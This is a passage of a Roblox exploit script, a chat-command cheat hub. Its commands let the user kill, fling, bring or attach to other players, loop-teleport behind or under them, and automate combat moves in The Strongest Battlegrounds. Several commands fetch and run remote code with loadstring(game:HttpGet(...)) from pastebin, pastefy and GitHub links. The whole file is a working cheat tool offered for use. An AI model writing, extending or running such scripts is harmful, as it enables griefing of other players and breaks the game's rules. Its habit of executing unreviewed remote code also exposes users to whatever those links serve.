        if rootPart and targetRoot then
            rootPart.CFrame = targetRoot.CFrame
        else
            error("couldn't find HumanoidRootPart")
            looping = false
            break
        end
        task.wait()
    end
end

local function undertp(e)
	local localPlayer = speaker
	local target = findPlayer(e)

	if not target then
		error("user not found")
		return
	end

	looping = true
	notif("Teleporting behind and under " .. target.Name)

	while looping do
		target = findPlayer(e)

		if not target or not target.Character then
			notif("Target missing/left the game")
			looping = false
			break
		end

		local rootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
		local targetRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")

		if rootPart and targetRoot then
			-- Position the speaker under the target, behind them
			local offset = Vector3.new(0, -4.5, -1.5)  -- Under and slightly behind the target
			local targetPos = targetRoot.Position + offset

			-- Calculate the direction the speaker should face (opposite the target's front)
			local lookAtPos = targetRoot.Position + Vector3.new(0, 2, 5)  -- Tilt in front of the target for head alignment
			local lookCFrame = CFrame.lookAt(targetPos, lookAtPos)

			-- Apply the new CFrame to the speaker's HumanoidRootPart
			rootPart.CFrame = lookCFrame
		else
			error("Couldn't find HumanoidRootPart")
			looping = false
			break
		end

		task.wait()
	end
end


local function hasTool(player)
    return player.Backpack:FindFirstChildOfClass("Tool") or player.Character:FindFirstChildOfClass("Tool")
end


local function attach(targetName)
    local target = findPlayer(targetName)

    if not target or not target.Character then
        notif("Target not found or has no character..")
        return
    end

    if not hasTool(speaker) then
        notif("You need a tool to use this command.")
        return
    end

    local char = speaker.Character
    local tchar = target.Character
    local hum = char:FindFirstChildOfClass("Humanoid")
    local hrp = getRoot(char)
    local hrp2 = getRoot(tchar)

    if not hrp or not hrp2 then
        notif("HumanoidRootPart missing!")
        return
    end

    hum.Name = "1"
    local newHum = hum:Clone()
    newHum.Parent = char
    newHum.Name = "Humanoid"
    task.wait()
    hum:Destroy()
    workspace.CurrentCamera.CameraSubject = char
    newHum.DisplayDistanceType = "None"

    local tool = speaker.Backpack:FindFirstChildOfClass("Tool") or char:FindFirstChildOfClass("Tool")
    tool.Parent = char
    hrp.CFrame = hrp2.CFrame * CFrame.new(math.random(-100, 100) / 200, math.random(-100, 100) / 200, math.random(-100, 100) / 200)

    local n = 0
    repeat
        task.wait(0.1)
        n = n + 1
        if not hrp or not hrp2 or not hrp.Parent or not hrp2.Parent or n > 250 then
            break
        end
        hrp.CFrame = hrp2.CFrame
    until tool.Parent ~= char

    notif("Attachment ended.")
end

local function breakvelocity()
    local BeenASecond, V3 = false, Vector3.new(0, 0, 0)

    delay(1, function()
        BeenASecond = true
    end)

    while not BeenASecond do
        if speaker.Character then
            for _, v in ipairs(speaker.Character:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.Velocity, v.RotVelocity = V3, V3
                end
            end
        end
        task.wait()
    end
end

local function tpto(TARGET)
    local players = getPlayer(TARGET)
    if #players == 0 then
        error("Player not found")
        return
    end

    for _, target in pairs(players) do
        if target.Character then
            local speakerRoot = getRoot(speaker.Character)
            local targetRoot = getRoot(target.Character)
            if speakerRoot and targetRoot then
                local humanoid = speaker.Character:FindFirstChildOfClass('Humanoid')
                if humanoid and humanoid.SeatPart then
                    humanoid.Sit = false
                    task.wait(0.1)
                end
                speakerRoot.CFrame = targetRoot.CFrame + Vector3.new(3,1,0)
            end
        end
    end
    breakvelocity()
end

function tools(plr)
    if plr:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass('Tool') or plr.Character:FindFirstChildOfClass('Tool') then
        return true
    end
end

function getRoot(char)
    local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
    return rootPart
end

local function loopbehind(e)
    local localPlayer = speaker
    local target = findPlayer(e)

    if not target then
        error("User not found")
        return
    end

    looping = true
    notif("Teleporting behind " .. target.Name .. "...")

    while looping do
        target = findPlayer(e)
        if not target or not target.Character then
            notif("Target missing/left the game")
            looping = false
            break
        end

        local rootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
        local targetRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")

        if rootPart and targetRoot then
            -- Teleport behind the target
            local offset = targetRoot.CFrame.LookVector * -1 -- Moves 2 studs behind the target
            rootPart.CFrame = targetRoot.CFrame + offset
        else
            error("Couldn't find HumanoidRootPart")
            looping = false
            break
        end
        task.wait()
    end
end

function bring(target)
    local speaker = speaker
    if tools(speaker) then
        if target ~= nil then
            local NormPos = getRoot(speaker.Character).CFrame
            local hrp = getRoot(speaker.Character)
            attach(target)
            repeat
                task.wait()
                hrp.CFrame = NormPos
            until not getRoot(target.Character) or not getRoot(speaker.Character)
            speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
        end
    else
        error('You need to have an item in your inventory to use this command')
    end
end

local function usetsbmove(move)
    local player = game:GetService("Players").LocalPlayer
    local backpack = player.Backpack
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local toolName = move 

    local tool = backpack:FindFirstChild(toolName)

    if tool then

        tool.Parent = character
        humanoid:EquipTool(tool)


        if tool:IsA("Tool") then
            tool:Activate()
        else
            error("No activation method found for the " .. toolName .. " tool.")
            return
        end


        wait(1) 
        humanoid:UnequipTools()  
        tool.Parent = backpack  
    else
        error(toolName .. " not found in Backpack.")
    end
end

wait()



commands.say = function(msg)
    if dontuse then return end
    dontuse = true
    task.wait(.2)
    chatMessage(msg)
    task.wait(.2)
    dontuse = false
end

wait()

commands.autolock = function()
    if dontuse then return end
    dontuse = true
    task.wait(.2)
    loadstring(game:HttpGet('https://pastebin.com/raw/c2tsb2c4'))()
    notif("Press E to toggle autolock")
    task.wait(.5)
    dontuse = false
end

wait()

commands.lookat = function(plr)
    lookAt(plr)
end

wait()

commands.lockon = function(plr)
    locking = true
    while locking do
        lookAt(plr)
        task.wait()
    end
end

wait()

commands.unlockon = function()
    locking = false
end

wait()

commands.tpwalk = function(num)
    if dontuse then return end
    dontuse = true
    task.wait(.2)
    notif("set tpwalk to ".. num)  
    tpwalk(num)
    task.wait(.2)
    dontuse = false
end

wait()

commands.untpwalk = function()
    tpwalking = false
    notif("disabled tpwalk")
end

wait()

commands.reset = function()
    notif("Resetted")
    reset()
end

wait()

commands.rejoin = function(yesorno)
    rejoin()
end
wait()

commands.rj = function()
    rejoin()
end
wait()

commands.kick = function(raw)
    local target, reason = raw:match("^(%S+)%s+(.+)$")
    if target and reason then
        local fullname = getfullname(target)
        sc("..kickthisguy1314".. fullname .. " " .. reason)
        notif("Target: " .. fullname)
        notif("Reason: " .. reason)
    end
end

commands.tpclick = function(key)
    tpclick(key)
    if not tpclicksuccess then
        error("invalid keybind,usable keybinds:")
        notif("-> m1, m2, m3")
        notif("-> ctrl, shift, alt, fn")
        notif("-> f1, f2, f3, etc")
        notif("-> a, b, c, etc")
        notif("example usage: >tpclick ctrl+shift+a")
    elseif tpclicksuccess then
        notif("successfully binded ".. key)
        wait(1)
        tpclicksuccess = false
    end
end

wait()

commands.jerk = function()
    if dontuse then return end
    dontuse = true
    task.wait(.2)
    local character = speaker.Character
    local isR6 = character:FindFirstChild("Torso") ~= nil
    if isR6 then
        notif("R6 Detected.")
        loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
    else
        notif("R15 Detected.")
        loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
    end
    task.wait(.2)
    dontuse = false
end

wait()

commands.tsbbring = function(target)
    if game.PlaceId ~= 10449761463 then
        error("this command only works on The Strongest Battlegrounds.")
        return
    end
    if not target then
        error("user not found")
        return
    end
    local targetname = getfullname(target)
    local live = game.Workspace.Live:FindFirstChild(targetname)
    local user = speaker
    local a = user.Character.HumanoidRootPart
    local bkp = user.Backpack
    local firstcd = user.PlayerGui.Hotbar.Backpack.Hotbar["1"].Base:FindFirstChild("Cooldown")
    local secondcd = user.PlayerGui.Hotbar.Backpack.Hotbar["2"].Base:FindFirstChild("Cooldown")
    local thirdcd = user.PlayerGui.Hotbar.Backpack.Hotbar["3"].Base:FindFirstChild("Cooldown")
    local fourthcd = user.PlayerGui.Hotbar.Backpack.Hotbar["4"].Base:FindFirstChild("Cooldown")
    local currentpos = a.CFrame
    local special = false
    local actualpos = CFrame.new(currentpos.Position)  -- Extract position and use it for CFrame.new
    local normmax = speaker.CameraMaxZoomDistance
    local normmin = speaker.CameraMinZoomDistance
    if dontuse then
        error("ew")
        return
    else
        dontuse = true
    end

    task.wait(.2)

    if bkp:FindFirstChild("Flowing Water") or bkp:FindFirstChild("Lethal Whirlwind Stream") then
        if not firstcd or not secondcd then
            if bkp:FindFirstChild("Flowing Water") and not firstcd then
                spawn(function()
                    undertp(target)
                end)
                task.wait(.2)
                if live:FindFirstChild("M1ing") then
                    notif("Waiting for target to stop m1ing...")
                    repeat wait() until not live:FindFirstChild("Freeze") and not live:FindFirstChild("M1ing")
                end
                usetsbmove("Flowing Water") 
            elseif bkp:FindFirstChild("Lethal Whirlwind Stream") and not secondcd then
                spawn(function()
                    looptp(target)
                end)
                task.wait(.2)
                if live:FindFirstChild("M1ing") then
                    notif("Waiting for target to stop m1ing...")
                    repeat wait() until not live:FindFirstChild("Freeze") and not live:FindFirstChild("M1ing")
                end
                usetsbmove("Lethal Whirlwind Stream")
            end
        else
            error("All your compatible moves are on cooldown, try again later")
            looping = false
            dontuse = false
            return
        end
    end

    if bkp:FindFirstChild("Bullet Barrage") or bkp:FindFirstChild("Head First") then
        if not fourthcd or not firstcd then
            if bkp:FindFirstChild("Head First") and not fourthcd then
                spawn(function()
                    looptp(target)
                end)
                if live:FindFirstChild("M1ing") then
                    notif("Waiting for target to stop m1ing...")
                    repeat wait() until not live:FindFirstChild("Freeze") and not live:FindFirstChild("M1ing")
                end
                usetsbmove("Head First")
            elseif bkp:FindFirstChild("Bullet Barrage") and not firstcd then
                spawn(function()
                    loopbehind(target)
                end)
                task.wait(.2)
                if live:FindFirstChild("M1ing") then
                    notif("Waiting for target to stop m1ing...")
                    repeat wait() until not live:FindFirstChild("Freeze") and not live:FindFirstChild("M1ing")
                end
                usetsbmove("Bullet Barrage")
                task.wait(.2)
            end
        else
            error("All your compatible moves are on cooldown, try again later")
            dontuse = false
            return
        end
    end

    if bkp:FindFirstChild("Beatdown") or bkp:FindFirstChild("Homerun") or bkp:FindFirstChild("Foul Ball") then
        if not secondcd or not firstcd or not fourthcd then
            if bkp:FindFirstChild("Beatdown") and not secondcd then
                spawn(function()
                    loopbehind(target)
                end)
                task.wait(.2)
                if live:FindFirstChild("M1ing") then
                    notif("Waiting for target to stop m1ing...")
                    repeat wait() until not live:FindFirstChild("Freeze") and not live:FindFirstChild("M1ing")
                end
                usetsbmove("Beatdown")
            elseif bkp:FindFirstChild("Homerun") and not firstcd then
                spawn(function()
                    loopbehind(target)
                end)
                task.wait(.2)
                if live:FindFirstChild("M1ing") then
                    notif("Waiting for target to stop m1ing...")
                    repeat wait() until not live:FindFirstChild("Freeze") and not live:FindFirstChild("M1ing")
                end
                spawn(function()
                    usetsbmove("Homerun")
                end)
                wait(.5)
            elseif bkp:FindFirstChild("Foul Ball") and not fourthcd then
                spawn(function()
                    loopbehind(target)
                end)
                task.wait(.2)
                if live:FindFirstChild("M1ing") then
                    notif("Waiting for target to stop m1ing...")
                    repeat wait() until not live:FindFirstChild("Freeze") and not live:FindFirstChild("M1ing")
                end
                usetsbmove("Foul Ball")
            end
        else
            error("All your compatible moves are on cooldown, try again later")
            dontuse = false
            return
        end
    end

    if bkp:FindFirstChild("Atmos Cleave") then
        if not secondcd then   
            if bkp:FindFirstChild("Atmos Cleave") and not secondcd then
                spawn(function()
                    undertp(target)
                end)
                task.wait(.2)
                if live:FindFirstChild("M1ing") then
                    notif("Waiting for target to stop m1ing...")
                    repeat wait() until not live:FindFirstChild("Freeze") and not live:FindFirstChild("M1ing")
                end
                usetsbmove("Atmos Cleave")
            end
        else
            error("All your compatible moves are on cooldown, try again later")
        end
    end

    if bkp:FindFirstChild("Crushing Pull") or bkp:FindFirstChild("Windstorm Fury") then
            if bkp:FindFirstChild("Crushing Pull") and not firstcd then
                spawn(function()
                    undertp(target)
                end)
                task.wait(.2)
                if live:FindFirstChild("M1ing") then
                    notif("Waiting for target to stop m1ing...")
                repeat wait() until not live:FindFirstChild("Freeze") and not live:FindFirstChild("M1ing")
                end
                user.CameraMaxZoomDistance = 0.5
                lookAt(target)
                wait()
                spawn(function()
                    usetsbmove("Crushing Pull")
                end)
                spawn(function()
                    task.wait(1)
                    user.CameraMaxZoomDistance = 21
                    user.CameraMinZoomDistance = 20
                    wait(.1)
                    user.CameraMaxZoomDistance = normmax
                    user.CameraMinZoomDistance = normmin
            end)
        end
    end
    task.wait(.3)
    looping = false
    a.CFrame = currentpos
    dontuse = false
end

wait()
local flinging = false
commands.loopfling = function(target)
    local weweffwe = getfullname(target)
    notif("Loopflinging" .. weweffwe)
    flinging = true
    while flinging do
        fling(target)
        task.wait(1)
    end
end

commands.unloopfling = function()
    notif("Stopped loopflinging")
    flinging = false
end

commands.fling = function(target)
    fling(target)
end

wait()

commands.lbbg = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/FidNdxXV"))()
end

wait()

commands.looptp = function(target)
    looptp(target)
end

wait()

commands.unlooptp = function(target)
    looping = false
end

wait()

commands.bring = function(target)
    if target then
        bring(target) 
    else
        error("user not found")
    end
end

wait()

commands.attach = function(target)
    if target then
        attach(target)
    else
        notif("Usage: " .. prefix .. "attach [player]")
    end
end

wait()

commands.reveal = function(plr) 
    local target = getfullname(plr)
    local timer = false
    local revealed = false
    respondedmessage = false
    if not Players:FindFirstChild(target) then
        error("invalid target")
        return
    end
    if dontuse then return end
    dontuse = true
    task.wait(.2)
    notif("Please wait")
    spawn(function()
        wait(6)
        timer = true
    end)
    for i = 1,20 do
        sc("..checkforusingthis218 ".. target)
        task.wait()
    end
    repeat task.wait() until respondedmessage or timer
    if respondedmessage then
        notif("target is using this script")
    elseif timer then
        error("target is not using this script")
    end
    task.wait(.2)
    dontuse = false
end

wait()

commands.silentchat = function(e)
    if not e or e == "" then return end
    notif("Chatted silently: " .. e)
    sc(e)
end

wait()

commands.sc = function(e)
    if not e or e == "" then return end
    notif("Chatted silently: " .. e)
    sc(e)
end

wait()

commands.breakvelocity = function()
    breakvelocity()
    notif("broke velocity")
end

wait()

commands.tpto = function(target)
    tpto(target)
end

wait()

commands.copyfullname = function(target)
    local fullname = getfullname(target)
    setclipboard(fullname)
    notif("Copied : ".. fullname)
end

wait()

commands.copyfn = function(target)
    local fullname = getfullname(target)
    setclipboard(fullname)
    notif("Copied : ".. fullname)
end

wait()

commands.kill = function(plr)
    if dontuse then
        return
    end
    dontuse = true
    task.wait(.1)
	local speaker = speaker
	local target = findPlayer(plr)

	if not target or not target.Character then
		notif("Could not find target's character.")
		return
	end

	if tools(speaker) then
		local currentpos = getRoot(speaker.Character).CFrame
		local hrp = getRoot(speaker.Character)
        task.wait()
		attach(plr)

		repeat
			task.wait()
			if hrp then
				hrp.CFrame = CFrame.new(999999, workspace.FallenPartsDestroyHeight + 5, 999999)
			end
		until not getRoot(target.Character) or not getRoot(speaker.Character)
        notif("Killed target")
        speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = currentpos

	else
		notif("You need to have an item in your inventory to use this command")
	end
    task.wait()
    dontuse = false
end

wait()


commands.airwalk = function()
    local speaker = speaker
    airwalk(speaker)
end

wait()

commands.unairwalk = function()
    local speaker = speaker
    unairwalk(speaker)
end

wait()

commands.toloc = function(loc)
    if loc == "bigplatform" or loc == "bpf" then
        gotocframe(CFrame.new(1028.55798, 481.220215, 23000.375, 0.997213364, 7.31949257e-08, 0.0746019781, -7.33295806e-08, 1, -9.34153754e-10, -0.0746019781, -4.53898119e-09, 0.997213364))
    elseif loc == "tsbedge" then
        gotocframe(CFrame.new(-193.688171, 539.585571, -426.296234, 0.38698405, -4.57593679e-08, -0.922086418, 6.23400931e-09, 1, -4.70095927e-08, 0.922086418, 1.24436665e-08, 0.38698405))
    elseif loc == "tsbmountain" then
        gotocframe(CFrame.new(90.5111389, 652.838135, -356.541962, -0.675031662, -9.12752469e-08, -0.737788737, -3.0716933e-08, 1, -9.56104884e-08, 0.737788737, -4.18775024e-08, -0.675031662))
    elseif loc == "dark" then
        gotocframe(CFrame.new(-2.42143869e-08, 8.9999999e+11, -1.11758709e-08, 1, -6.99137601e-08, -3.7177882e-14, 6.99137601e-08, 1, 3.21123927e-08, 3.49327839e-14, -3.21123927e-08, 1))
    elseif loc == "pixel" then
        gotocframe(CFrame.new(30000000, 29999920, 30000000, 1, 1.35856171e-08, -4.3734493e-14, -1.35856171e-08, 1, -6.24038021e-09, 4.36497152e-14, 6.24038021e-09, 1))
    elseif loc == "whitebox" then
        gotocframe(CFrame.new(-2023.15149, 204.172897, 459.454956, -0.967054963, 4.93500019e-10, 0.254567713, 3.46459444e-10, 1, -6.22446261e-10, -0.254567713, -5.13742326e-10, -0.967054963))
    
    end
end
wait()

commands.scl = function()
    if dontuse then return end
    dontuse = true
    task.wait(.5)
    local root = speaker.Character and speaker.Character:FindFirstChild("HumanoidRootPart")
    if root then
        local pos = root.Position
        local cframevar = string.format("%.0f, %.0f, %.0f", pos.X, pos.Y, pos.Z)
        notif(cframevar)
        setclipboard(cframevar)
    end
    task.wait(.5)
    dontuse = false
end

wait()

commands.simplecopyloc = function()
    if dontuse then return end
    dontuse = true
    task.wait(.5)
    local root = speaker.Character and speaker.Character:FindFirstChild("HumanoidRootPart")
    if root then
        local pos = root.Position
        local cframevar = string.format("%.0f, %.0f, %.0f", pos.X, pos.Y, pos.Z)
        notif(cframevar)
        setclipboard(cframevar)
    end
    task.wait(.5)
    dontuse = false
end

wait()



commands.copyloc = function()
    local a = speaker.Character.HumanoidRootPart.CFrame
    setclipboard(tostring(a))
end

commands.moveset = function(move)
    if game.PlaceId ~= 10449761463 then
        error("this command only works on The Strongest Battlegrounds.")
        return
    end
    if dontuse then return end
    dontuse = true
    task.wait(.1)
    if moveset == "trashcanman" or "trashcan" or "tcm" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/yes1nt/yes/refs/heads/main/Trashcan%20Man",true))()
    elseif moveset == "gojo" then
        getgenv().FatalCombatSkillLayout = true
        loadstring(game:HttpGet("https://gist.githubusercontent.com/SonicexePort/d83f3eca5e8092468df1551df09db39a/raw/861f16fbae8fab8803cabfbc01295bb5b687f86a/Death%20Port%20Six%20Eyes%20Public%20Beta"))()
    elseif moveset == "mahito" then
        getgenv().Swordm1= true -- set trueif you want have sword thing on mahito m1
        getgenv().night = false  -- set true if you want night 
        getgenv().plushie = false ---set true if you want plushie mahito 
        getgenv().blackflash = true ---set true if you want v1 truly black flash
        getgenv().chat = false ---set true if you visual to other pov that your mahito
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Kenjihin69/Kenjihin69/refs/heads/main/Mahito%20v2%20sigma%20tp%20exploit'))()
    elseif moveset == "johndoe" or moveset == "john" or moveset == "jd" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Luckyfromyoutube/JohnDoe/refs/heads/main/TSBMODEL"))()
    else
        warn("invalid moveset, use >cmdlist for the list of movesets")
    end
    task.wait(.1)
    dontuse = true
end

wait()

commands.undertp = function(plr)
    undertp(plr)
end

wait()

commands.cmdlist = function()
    if dontuse then
        return
    end
    dontuse = true
    task.wait(.1)
    notif("Check F9 for the list of commands")
    print("")
    print("")
    print("----------------------------------CMD LIST---------------------------------------------")
    print("KILL: Kills the selected target [TOOL REQUIRED]") -- 1
    print("BRING : Brings the selected target to you [TOOL REQUIRED]") -- 2
    print("ATTACH: Attaches the selected target to you [TOOL REQUIRED]") -- 3
    print("TPTO: Teleports you to the selected target") -- 4
    print("TPCLICK: Sets up a teleport-click script with customizable keybinds") -- 5
    print("LBBG: Lucky block battlegrounds script [LBBG ONLY]") -- 6
    print("TSBBRING: Brings the selected target to you [TSB ONLY]") -- 7
    print("BREAKVELOCITY: Breaks your velocity") -- 8
    print("LOOPTP: Loop teleports to the selected target") -- 9
    print("UNLOOPTP: Stops loop teleporting")  -- 10
    print("REJOIN/RJ: Rejoins the server") -- 11
    print("AIRWALK: Allows you to walk on air") -- 12
    print("UNAIRWALK: Disables airwalk") -- 13
    print("RESET: Resets the speaker's Character") -- 15
    print("TPWALK: Teleport walks you with the set speed (NUMBER REQUIRED)") -- 16
    print("UNTPWALK: Disables tpwalk") -- 17
    print("MOVESET: (MOVESET REQUIRED )Movesets: trashcanman/trashcan/tcm | johndoe,jd,john | gojo | mahito [ TSB ONLY ]") -- 18
    print("COPYLOC: Copies your current CFrame") -- 19
    print("TOLOC: Teleports you to set locations (LOCATION) [LIST OF SET TELEPORTATIONS DOWN BELOW]") -- 20
    print("SILENTCHAT: Silently Chats a message (MSG)") -- 21
    print("JERK: uhhhh") -- 22
    print("UNDERTP: Teleports under the target [ >unlooptp to stop ]")-- 23
    print("SIMPLECOPYLOC / SCL: Copies the cframe with a simple format, no e+ and only front three coords")-- 24
    print("AUTOLOCK: Auto locks onto the player your cursor is pointing to")-- 25
    print("LOCKON: Locks your camera on the selected target") -- 26
    print("UNLOCKON: Disables lockon") -- 27 (27 - 1)
    print("LOOKAT: Looks at the selected target") -- 27
    print("SAY: Says the selected message ") -- 28
    print("FLING: Flings the selected target") -- 29
    print("LOOPFLING: Loop flings the selected target") -- 30
    print("UNLOOPFLING: Stops loop flinging") -- 31
    print("COPYFULLNAME/COPYFN: Copies the selected target's full username.") -- 32
    print("----------------------------------TP LIST---------------------------------------------")
    print("whitebox [LBBG ONLY]")
    print("tsbedge [TSB ONLY]")
    print("bigplatform / bpf [TSB ONLY]")
    print("tsbmountain [TSB ONLY]")
    print("dark")
    print("pixel")
    wait(.5)
    dontuse = false
end

wait()


addFrame("  bring (plr) [TOOL]  ") wait(randNum) rollrand()

task.wait()

addFrame(" attach (plr) [TOOL] ") wait(randNum) rollrand()

task.wait()

addFrame("         tpto (plr)         ")  wait(randNum) rollrand()

task.wait()

addFrame("  tpclick (KEYBIND)  ") wait (randNum) rollrand()

task.wait()

addFrame("            lbbg           ") wait(randNum) rollrand()

task.wait()

addFrame("  tsbbring [BUGGY] ") wait(randNum) rollrand()

task.wait()

addFrame("    breakvelocity    ") wait(randNum) rollrand()

task.wait()

addFrame("      looptp (plr)      ") wait(randNum) rollrand()

task.wait()

addFrame("     unlooptp (plr)     ") wait(randNum) rollrand()

task.wait()

addFrame("         rejoin/rj          ") wait(randNum) rollrand()
 
task.wait()

addFrame("          airwalk          ") wait(randNum) rollrand()
  
task.wait()

addFrame("        unairwalk        ") wait(randNum) rollrand()
  
task.wait()

addFrame("          kill (plr)          ") wait(randNum) rollrand()

task.wait()

addFrame("          reset            ") wait(randNum) rollrand()

task.wait()

addFrame("     tpwalk (num)      ") wait(randNum) rollrand()

task.wait()

addFrame("        untpwalk        ") wait(randNum) rollrand()

task.wait()

addFrame("  moveset (move)  ") wait(randNum) rollrand()

task.wait()

addFrame("        copyloc          ") wait(randNum) rollrand()

task.wait()

addFrame("       toloc (loc)        ") wait(randNum) rollrand()

task.wait()

addFrame("             jerk             ") wait(randNum) rollrand()

task.wait()

addFrame("silentchat/sc (msg)") wait(randNum) rollrand()

task.wait()

addFrame("     undertp (plr)     ") wait(randNum) rollrand()

task.wait()

addFrame(" simplecopyloc/scl ") wait(randNum) rollrand()

task.wait()

addFrame("        autolock        ") wait(randNum) rollrand()

task.wait()

addFrame("      lockon (plr)      ") wait(randNum) rollrand()

task.wait()

addFrame("        unlockon        ") wait(randNum) rollrand()

task.wait()

addFrame("       say (msg)       ") wait(randNum) rollrand()

task.wait()

addFrame("      lookat (plr)      ") wait(randNum) rollrand()

task.wait()

addFrame("        fling (plr)        ") wait(randNum) rollrand()

task.wait()

addFrame("    loopfling (plr)    ") wait(randNum) rollrand()

task.wait()

addFrame("      unloopfling      ") wait(randNum) rollrand()

task.wait()

addFrame("copyfullname/copyfn") wait(randNum) rollrand()

task.wait()

--[[
addFrame("        unlockon        ") wait(randNum) rollrand()

task.wait()

addFrame("        unlockon        ") wait(randNum) rollrand()

task.wait()

addFrame("        unlockon        ") wait(randNum) rollrand()

task.wait()

addFrame("        unlockon        ") wait(randNum) rollrand()

task.wait()

addFrame("        unlockon        ") wait(randNum) rollrand()

]]


speaker.Chatted:Connect(function(msg)
    if string.sub(msg, 1, 1) == prefix then
        local args = string.split(string.sub(msg, 2), " ")
        local command = args[1]
        table.remove(args, 1)

        if commands[command] then
            commands[command](table.concat(args, " "))
        else
            notif("invalid command")
            dontuse = false
        end
    end
end)



for _, player in ipairs(Players:GetPlayers()) do
    ConnectP1000(player)
end

Players.PlayerAdded:Connect(function(player)
    ConnectP1000(player)
end)

 
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
	ConnectP1(v)
    ConnectP3(v)
end

game:GetService("Players").PlayerAdded:Connect(function(plr)
	ConnectP1(plr)
    ConnectP3(plr)
end)

wait()
notif("cmdhub loaded")
notif("type ".. prefix .."cmdlist to see the list of commands")
